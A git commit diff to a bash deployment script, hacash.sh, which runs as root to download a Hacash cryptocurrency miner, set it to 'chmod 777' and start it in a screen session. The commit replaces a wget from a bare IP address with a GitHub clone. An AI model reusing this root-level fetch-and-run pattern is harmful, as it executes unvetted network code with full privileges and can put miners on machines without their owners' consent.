cb822a3b06245c1c7650806f1190560277b98058
yuqingkj <42601051+yuqingkj@users.noreply.github.com>
2021-06-13 17:53:38 +0800

    Update hacash.sh

--- hacash.sh
+++ hacash.sh
@@ -1,10 +1,9 @@
 #!/bin/bash
 sudo -i <<EOF
-wget http://3.95.133.91:8000/hacash.tar.gz
-tar -xvf hacash.tar.gz
-cd hacash/
+apt install git -y
+git clone https://github.com/yuqingkj/minehac.git
+cd minehac/
 chmod 777 ./hacash_miner
-screen -dmS hac
 screen -x -S hac -p 0 -X stuff "./hacash_miner \n"
 echo ok
 EOF
